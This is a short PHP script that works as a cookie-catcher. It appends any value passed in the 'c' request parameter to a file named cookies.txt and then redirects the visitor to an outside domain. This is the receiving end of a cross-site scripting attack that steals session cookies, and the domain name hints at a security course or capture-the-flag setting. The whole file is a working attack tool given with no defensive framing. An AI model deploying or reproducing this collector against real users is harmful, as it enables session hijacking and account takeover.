<?php

if (isset($_REQUEST["c"])) {
  $fp = fopen("cookies.txt", "a+");
  fwrite($fp, $_REQUEST["c"] . "\n");
  fclose($fp);
}

header("Location: http://kerberosclan.csec.chatzi.org/");
